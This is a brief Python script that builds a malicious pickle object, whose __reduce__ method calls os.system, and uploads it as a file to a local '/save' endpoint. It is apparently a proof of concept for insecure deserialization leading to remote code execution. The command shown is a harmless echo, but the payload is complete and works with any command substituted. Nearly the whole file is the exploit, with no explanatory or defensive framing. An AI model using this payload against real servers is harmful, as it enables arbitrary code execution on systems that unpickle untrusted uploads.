import pickle
import base64
import requests

url = 'http://localhost:5000/save'


class PickleRCE(object):
    def __reduce__(self):
        import os
        return (os.system, (command,))


command = 'echo "HELLO"'

data = PickleRCE()

pickled_data = pickle.dumps(data)

files = {'file': ('data.pkl', pickled_data, 'application/octet-stream')}
response = requests.post(url, files=files)

if response.status_code == 200:
    print("Data saved successfully.")
else:
    print(f"An error occurred: {response.text}")
